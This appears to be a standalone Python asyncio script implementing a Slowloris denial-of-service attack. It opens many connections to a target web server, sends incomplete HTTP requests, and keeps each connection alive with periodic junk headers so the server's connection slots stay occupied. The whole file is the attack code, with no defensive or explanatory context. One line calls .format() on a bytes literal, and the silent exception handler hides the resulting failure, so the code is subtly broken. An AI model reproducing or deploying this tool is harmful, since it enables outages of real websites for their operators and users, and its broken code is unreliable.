import asyncio
import random

class Slowloris:
    def __init__(self, target, connections):
        self.target = target.replace('https://', '').replace('http://', '').split('/')[0]
        self.connections = connections
        self.port = 443 if 'https' in target else 80
        
    async def slow_connection(self):
        try:
            reader, writer = await asyncio.open_connection(self.target, self.port)
            
            writer.write(b"GET /?{} HTTP/1.1\r\n".format(random.randint(0, 9999)))
            writer.write(f"Host: {self.target}\r\n".encode())
            writer.write(b"User-Agent: Mozilla/5.0\r\n")
            writer.write(b"Accept-Language: en-US,en;q=0.5\r\n")
            await writer.drain()
            
            while True:
                await asyncio.sleep(random.randint(10, 20))
                writer.write(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                await writer.drain()
                
        except Exception:
            pass
    
    async def run(self, duration):
        tasks = [self.slow_connection() for _ in range(self.connections)]
        
        try:
            await asyncio.wait_for(
                asyncio.gather(*tasks, return_exceptions=True),
                timeout=duration
            )
        except asyncio.TimeoutError:
            pass